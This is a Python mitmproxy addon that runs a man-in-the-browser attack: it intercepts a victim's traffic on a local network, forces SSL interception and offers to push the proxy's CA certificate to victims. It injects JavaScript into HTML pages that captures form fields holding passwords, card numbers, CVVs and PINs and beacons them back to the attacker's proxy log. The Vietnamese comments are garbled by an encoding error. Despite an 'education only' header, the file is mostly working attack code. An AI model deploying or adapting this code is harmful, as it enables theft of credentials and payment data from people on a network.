#!/usr/bin/env python3
"""
Man-in-the-Browser (MitB) Attack Simulation Module
S·ª≠ d·ª•ng MitM ƒë·ªÉ ti√™m JavaScript v√†o c√°c trang web c·ªßa n·∫°n nh√¢n.
*** C·∫¢NH B√ÅO: CH·ªà S·ª¨ D·ª§NG CHO M·ª§C ƒê√çCH GI√ÅO D·ª§C V√Ä NGHI√äN C·ª®U. ***
"""

import os
import time
import logging
import shutil
import sys
from typing import Optional
from colorama import Fore, Style

# --- Path Fix for mitmproxy ---
# When mitmproxy runs this script with -s, it loses the package context.
# This adds the project root to the path to allow absolute imports.
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# Import c√°c th√†nh ph·∫ßn c·∫ßn thi·∫øt t·ª´ module mitm
from modules.mitm import MitmAttacker
from modules import utils

# Import c√°c th√†nh ph·∫ßn c·ªßa mitmproxy
from mitmproxy import http, ctx

# --- JavaScript Payload ---
# ƒêo·∫°n m√£ n√†y s·∫Ω ƒë∆∞·ª£c ti√™m v√†o c√°c trang web c·ªßa n·∫°n nh√¢n.
JS_PAYLOAD = """
(function() {
    'use strict';
    console.log('[MitB] Payload Injected! Connection is being monitored.');

    // 1. Hi·ªÉn th·ªã m·ªôt banner c·∫£nh b√°o tr√™n ƒë·∫ßu trang
    function showSecurityBanner() {
        const banner = document.createElement('div');
        banner.innerHTML = 'üî• <b>SYSTEM WARNING</b>: This connection is being actively monitored for security analysis purposes. üî•';
        banner.style.backgroundColor = '#ffc107';
        banner.style.color = 'black';
        banner.style.padding = '10px';
        banner.style.textAlign = 'center';
        banner.style.fontSize = '14px';
        banner.style.fontWeight = 'bold';
        banner.style.position = 'fixed';
        banner.style.top = '0';
        banner.style.left = '0';
        banner.style.width = '100%';
        banner.style.zIndex = '9999';
        document.body.prepend(banner);
        // ƒê·∫©y n·ªôi dung trang xu·ªëng ƒë·ªÉ kh√¥ng b·ªã che
        document.body.style.paddingTop = banner.offsetHeight + 'px';
    }

    // 2. B·∫Øt s·ª± ki·ªán g·ª≠i form ƒë·ªÉ ƒë√°nh c·∫Øp d·ªØ li·ªáu
    function interceptFormSubmissions() {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', function(e) {
                const formData = new FormData(form);
                const capturedData = {};
                let hasSensitiveData = false;

                for (let [key, value] of formData.entries()) {
                    const lowerKey = key.toLowerCase();
                    // T√¨m c√°c tr∆∞·ªùng nh·∫°y c·∫£m
                    if (lowerKey.includes('pass') || lowerKey.includes('card') || lowerKey.includes('cvv') || lowerKey.includes('secret') || lowerKey.includes('pin')) {
                        capturedData[key] = value;
                        hasSensitiveData = true;
                    }
                }

                if (hasSensitiveData) {
                    console.warn('[MitB] Captured sensitive form data:', capturedData);
                    // G·ª≠i d·ªØ li·ªáu b·ªã ƒë√°nh c·∫Øp v·ªÅ cho attacker qua m·ªôt "beacon"
                    // Attacker s·∫Ω th·∫•y log n√†y trong console c·ªßa mitmproxy
                    fetch('/mitb-beacon', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            page_url: window.location.href,
                            form_action: form.action,
                            captured_data: capturedData
                        })
                    }).catch(err => console.error('[MitB] Beacon failed:', err));
                }
            }, true); // S·ª≠ d·ª•ng capture phase ƒë·ªÉ ƒë·∫£m b·∫£o b·∫Øt ƒë∆∞·ª£c s·ª± ki·ªán
        });
    }

    // Ch·∫°y c√°c h√†m sau khi trang ƒë√£ t·∫£i xong
    window.addEventListener('load', () => {
        showSecurityBanner();
        interceptFormSubmissions();
    });
})();
"""

# --- Mitmproxy Addon ---
class BrowserInjector:
    def response(self, flow: http.HTTPFlow) -> None:
        """
        H√†m n√†y ƒë∆∞·ª£c g·ªçi cho m·ªói response t·ª´ server v·ªÅ client.
        """
        # Ch·ªâ ti√™m v√†o c√°c trang HTML
        content_type = flow.response.headers.get("content-type", "")
        if "text/html" in content_type:
            # L·∫•y n·ªôi dung HTML
            html = flow.response.get_text(strict=False)
            if html:
                # Ti√™m payload ngay tr∆∞·ªõc th·∫ª ƒë√≥ng </body>
                injection_point = html.rfind("</body>")
                if injection_point != -1:
                    injected_script = f"<script type='text/javascript'>{JS_PAYLOAD}</script>"
                    html = html[:injection_point] + injected_script + html[injection_point:]
                    flow.response.text = html
                    ctx.log.info(f"[MitB] Injected payload into: {flow.request.pretty_host}")

    def request(self, flow: http.HTTPFlow) -> None:
        """
        H√†m n√†y ƒë∆∞·ª£c g·ªçi cho m·ªói request t·ª´ client l√™n server.
        """
        # B·∫Øt c√°c beacon g·ª≠i v·ªÅ t·ª´ JS payload
        if flow.request.path == "/mitb-beacon":
            beacon_data = flow.request.get_text()
            ctx.log.warn(f"{Fore.RED}[MitB] üö® CAPTURED SENSITIVE DATA üö®\n{beacon_data}{Style.RESET_ALL}")
            # Tr·∫£ v·ªÅ m·ªôt response r·ªóng ƒë·ªÉ ho√†n th√†nh request
            flow.response = http.Response.make(204)

# --- Runner Function ---
def run_mitb_attack(interface: str, **kwargs):
    """
    H√†m ƒëi·ªÅu ph·ªëi t·∫•n c√¥ng MitB.
    """
    try:
        print(f"\n{Fore.RED}=== MAN-IN-THE-BROWSER ATTACK SIMULATION ==={Style.RESET_ALL}")
        
        # T·∫°o m·ªôt MitmAttacker gi·∫£ ƒë·ªÉ truy c·∫≠p c√°c h√†m ti·ªán √≠ch
        dummy_attacker = MitmAttacker(interface, ["127.0.0.1"], "127.0.0.1")
        
        # Ch·ªçn n·∫°n nh√¢n v√† gateway
        all_targets = utils.load_targets_from_scan(dummy_attacker.logger, dummy_attacker.attacker_ip, exclude_router=False, exclude_attacker=True)
        if not all_targets:
            print(f"{Fore.RED}[-] Kh√¥ng t√¨m th·∫•y thi·∫øt b·ªã n√†o. Vui l√≤ng ch·∫°y 'scan' tr∆∞·ªõc.{Style.RESET_ALL}")
            return

        victim_targets = [t for t in all_targets if not t.endswith('.1')]
        victim_ips = dummy_attacker._select_targets_from_menu(victim_targets, "CH·ªåN N·∫†N NH√ÇN (VICTIM)")
        if not victim_ips:
            print("[-] ƒê√£ h·ªßy t·∫•n c√¥ng.")
            return

        gateway_targets = [t for t in all_targets if t not in victim_ips]
        gateway_ip = dummy_attacker._select_targets_from_menu(gateway_targets, "CH·ªåN GATEWAY (ROUTER)")[0]
        if not gateway_ip:
            print("[-] ƒê√£ h·ªßy t·∫•n c√¥ng.")
            return

        print(f"\n{Fore.YELLOW}[!] T·∫•n c√¥ng MitB y√™u c·∫ßu SSL Interception ƒë·ªÉ ho·∫°t ƒë·ªông.")
        print(f"[!] N·∫°n nh√¢n PH·∫¢I c√†i ƒë·∫∑t ch·ª©ng ch·ªâ CA c·ªßa mitmproxy ƒë·ªÉ tr√°nh l·ªói k·∫øt n·ªëi.{Style.RESET_ALL}")
        
        cert_server_choice = input("[?] B·∫°n c√≥ mu·ªën kh·ªüi ƒë·ªông web server ƒë·ªÉ h·ªó tr·ª£ g·ª≠i ch·ª©ng ch·ªâ CA cho n·∫°n nh√¢n kh√¥ng? (Y/n): ").lower()
        start_cert_server = cert_server_choice != 'n'

        # Kh·ªüi t·∫°o MitmAttacker th·∫≠t s·ª±
        # B·∫Øt bu·ªôc b·∫≠t SSL Interception v√† ch·ªâ ƒë·ªãnh script addon l√† file n√†y
        attacker = MitmAttacker(interface, victim_ips, gateway_ip, 
                                enable_ssl_interception=True, **kwargs)
        
        # Ghi ƒë√® ƒë∆∞·ªùng d·∫´n script c·ªßa mitmproxy ƒë·ªÉ tr·ªè ƒë·∫øn ch√≠nh file n√†y
        attacker.mitmproxy_script_path = __file__

        if start_cert_server:
            attacker._start_ca_delivery_server(attacker.attacker_ip)

        if attacker.start_attack():
            try:
                while attacker.is_attacking():
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Ng∆∞·ªùi d√πng y√™u c·∫ßu d·ª´ng...")
        
        attacker.stop_attack()

    except KeyboardInterrupt:
        print("\n[*] H·ªßy t·∫•n c√¥ng.")
    except Exception as e:
        logging.error(f"L·ªói kh√¥ng mong mu·ªën trong MitB: {e}", exc_info=True)